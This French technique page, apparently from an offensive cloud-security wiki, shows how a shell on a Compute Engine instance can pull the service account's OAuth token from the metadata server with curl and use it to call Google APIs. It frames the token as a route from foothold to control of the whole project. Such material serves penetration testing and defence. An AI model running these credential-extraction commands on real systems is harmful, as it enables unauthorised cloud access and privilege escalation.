---
title: "Portée du compte de service : appeler les API en tant qu'instance"
description: "Détourner le compte de service attaché à une instance Compute Engine et ses portées OAuth pour appeler les API Google avec ses privilèges."
keywords:
  - service account scope
  - OAuth scope
  - instance service account
  - cloud-platform
  - GCE
---

# Portée du compte de service

Une instance Compute Engine s'exécute en tant que compte de service, et ce que peut faire ce jeton est l'intersection de deux choses : les **rôles IAM** accordés au compte de service, et les **portées OAuth** définies sur l'instance. Les instances héritées portent souvent le compte de service par défaut (fréquemment **Editor**) et la portée `cloud-platform`, qui ensemble rendent un shell sur la machine équivalent à un accès en écriture à l'échelle du projet.

## Lire l'identité et les portées

```bash
# from a shell on the instance
curl -s -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
curl -s -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
```

## Utiliser le jeton

```bash
TOKEN=$(curl -s -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | jq -r .access_token)
# call any API the SA roles + scope allow
curl -s -H "Authorization: Bearer $TOKEN" \
  https://cloudresourcemanager.googleapis.com/v1/projects/<project>:getIamPolicy -X POST
```

Si gcloud est présent, `gcloud auth list` affiche le compte de service actif de l'instance et les appels `gcloud` suivants l'utilisent directement.

## Notes d'exploitation

- Les portées plafonnent le jeton indépendamment de l'IAM : une portée `storage-ro` bloque les écritures même si le compte de service est Editor ; `cloud-platform` supprime totalement le plafond, vérifiez donc les portées en premier.
- Le compte de service Compute Engine par défaut avec Editor est le saut prise-de-pied-vers-contrôle-du-projet le plus courant de GCP ; énumérez ses liaisons à partir du jeton.
- Depuis le compte de service, vous atteignez les voies plus larges d'[impersonation](../../identity/service-account-impersonation/index.md) et d'[actAs](../../identity/privilege-escalation/index.md) s'il détient les bonnes permissions.

## Outils

- **gcloud** (`auth list`, puis les commandes normales exécutées en tant que compte de service).
- **curl** contre le serveur de métadonnées.

## Références

- [Rhino Security Labs: GCP privilege escalation (part 1)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)
- [Hacking the Cloud: GCP metadata](https://hackingthe.cloud/)
- [Google: service accounts and scopes](https://cloud.google.com/compute/docs/access/service-accounts)
